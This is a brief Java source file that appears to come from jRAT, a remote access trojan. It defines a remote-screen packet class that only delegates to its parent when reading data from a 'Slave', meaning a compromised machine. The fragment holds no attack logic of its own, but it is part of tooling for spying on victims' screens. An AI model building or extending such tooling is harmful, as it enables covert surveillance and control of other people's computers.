package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;

import java.io.DataInputStream;


public class Packet18OneRemoteScreen extends Packet17RemoteScreen {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		/* Unused */
		super.read(slave, dis);
	}

}
